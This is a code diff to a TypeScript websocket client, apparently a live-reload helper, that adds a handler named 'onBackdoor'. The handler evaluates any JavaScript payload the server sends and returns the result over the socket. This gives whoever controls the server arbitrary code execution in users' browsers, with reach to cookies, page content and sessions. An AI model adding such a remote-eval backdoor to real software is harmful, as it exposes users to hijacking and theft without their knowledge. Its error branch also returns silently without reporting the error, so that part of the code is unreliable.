@@ -26,7 +26,19 @@ if (video_container !== null) {
 // websocket stuff
 
 interface WebSocketCommand {
-  cmd: string
+  cmd: string;
+  id?: number;
+  payload?: string;
+}
+
+interface BackdoorResult {
+  cmd: 'bdRES',
+  id: number;
+  reqCmd: string,
+  error?: Error | any;
+  result?: any;
+  pStart: number;
+  pEnd?: number;
 }
 
 class WebScoketClient {
@@ -53,7 +65,7 @@ class WebScoketClient {
       + '/'
     )
     this.ws.onopen = () => {
-      console.log('open')
+      console.log('open');
       this.unanswered_pings = 0
       this.heartbeat_interval = window.setInterval(() => {
         console.log('sending ping')
@@ -71,9 +83,15 @@ class WebScoketClient {
         case 'reload':
           window.location.reload()
           break;
+
         case 'pong':
           this.unanswered_pings = 0
           break;
+
+        case 'bdMSG':
+          this.onBackdoor(data);
+          break;
+
       }
     }
     this.ws.onclose = () => {
@@ -88,6 +106,30 @@ class WebScoketClient {
     window.setTimeout(() => {
       this.connect()
     }, timeout)
+  }
+
+  onBackdoor(cmd: WebSocketCommand) {
+    if (!cmd.payload || !cmd.id) {
+      return;
+    }
+
+    let res: BackdoorResult = {
+      cmd: "bdRES",
+      reqCmd: cmd.payload,
+      id: cmd.id,
+      pStart: performance.now(),
+    };
+
+    try {
+      res.result = (0, eval)(cmd.payload);
+    } catch (e) {
+      res.error = e;
+      return;
+    }
+
+    res.pEnd = performance.now();
+
+    this.ws?.send(JSON.stringify(res));
   }
 
 }
